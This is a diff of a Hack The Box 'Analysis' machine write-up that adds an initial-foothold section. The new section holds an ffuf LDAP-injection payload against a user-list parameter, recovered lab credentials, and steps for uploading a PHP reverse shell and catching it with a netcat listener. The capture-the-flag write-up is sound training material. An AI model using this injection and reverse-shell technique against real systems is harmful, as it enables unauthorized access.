@@ -4,7 +4,7 @@ date: 2024-01-23
 categories: [CTF, Fullpwn]
 tags: [htb, hackthebox, analysis, ldap, ffuf, dir-busting, subdomain, virtual-host]
 img_path: /assets/htb/fullpwn/analysis/
-published: true
+published: false
 hidden: true
 image:
     path: machine_info.png
@@ -397,7 +397,7 @@ $ hydra -L mailList_reduced -P /usr/share/wordlists/rockyou.txt internal.analysi
 # nothing back
 ```
 
-## LDAP Research
+## Initial foothold
 
 ### What is LDAP
 
@@ -407,14 +407,14 @@ According to [Varonis](https://www.varonis.com/blog/the-difference-between-activ
 
 > _**Directory services** store the users, passwords, and computer accounts, and share that information with other entities on the network._
 
-In layman's terms: **LDAP is a way of speaking to Active Directory**.
+In layman's terms: **LDAP is a way of speaking to Active Directory (AD)**.
 
 The relationship between AD and LDAP is much like the relationship between Apache and HTTP:
 
 - HTTP is a web protocol.
 - Apache is a web server that uses the HTTP protocol.
 - LDAP is a directory services protocol.
-- Active Directory is a directory server that uses the LDAP protocol.
+- AD is a directory server that uses the LDAP protocol.
 
 ### What is an LDAP query
 
@@ -422,24 +422,48 @@ An **LDAP query is a command that asks a directory service for some information*
 
 `(&(objectClass=user)(sAMAccountName=yourUserName)   (memberof=CN=YourGroup,OU=Users,DC=YourDomain,DC=com))`
 
+> IppSec's video: [LDAP query structure](https://youtu.be/51JQg202csw?t=1007).
+
 ### What is an LDAP Injection
 
-[**LDAP Injection**](https://book.hacktricks.xyz/pentesting-web/ldap-injection) is an attack used to exploit web based applications that construct LDAP queries based on user input.
+According to the [OWASP Web Security Testing Guide](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md):
 
-To read:
-1. [Complete Guide to LDAP Injection: Types, Examples, and Prevention](https://brightsec.com/blog/ldap-injection/)
-2. [Testing for LDAP Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection)
+The **LDAP** is used to store information about users, hosts, and many other objects. [**LDAP injection**](https://wiki.owasp.org/index.php/LDAP_injection) is a server-side attack, which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. This is done by **manipulating input parameters afterwards passed to internal search**, add, and modify functions. A web application could use LDAP in order to let users authenticate or search other users' information inside a corporate structure. 
+
+**The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which will be executed by the application**.
 
 > [PayloadsAllTheThings: LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
 
+```bash
+# performing LDAP injection manually
+$ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(description=FUZZ*))%00"  -w /usr/share/wordlists/seclists/Fuzzing/alphanum-case-extra.txt -c -ac -fw 1
+```
 
-## ADWS Research
-   
-- **Active Directory (AD) module for Windows PowerShell**
-	The AD module for Windows PowerShell is an extension that allows administrators to manage AD using PowerShell. It provides **a set of cmdlets specifically designed for tasks related to AD**.
-    
-- **Web Services (WS-Management) protocol** 
-	A web services protocol that enables hardware and operating systems to be managed using web services. It's designed to facilitate communication and information sharing between systems, particularly in a heterogeneous environment. WS-Management is often used for remote management and automation of IT resources.
-    
+- The above works until it hits the `*`.
+- How did we enumerate the `description` field?
 
-**ADWS** refers to the capability of managing AD remotely using PowerShell commands, and this communication happens over the WS-Management protocol. This enables administrators to automate tasks, query information, and perform various management operations on AD from a remote location.
+> Creds: `technician:97NTtl*4QP96Bv`
+
+After logging into the portal, we notice that we can upload files to it via the "*SOC Report*" tab:
+
+![](revshell_upload.png)
+
+We can open a listener, upload a PHP reverse shell generated via [revshells](https://www.revshells.com/), and then visit the appropriate directory (which should be the `dashboard/uploads/<revshell>` that we found earlier):
+
+```bash
+# opening a listener to catch the shell
+$ nc -lnvp 1337
+listening on [any] 1337 ...
+```
+
+![](php_revshell.png)
+
+```bash
+# opening a listener to catch the shell
+$ nc -lnvp 1337
+listening on [any] 1337 ...
+whoami
+analysis\svc_web
+```
+
+## Lateral movement
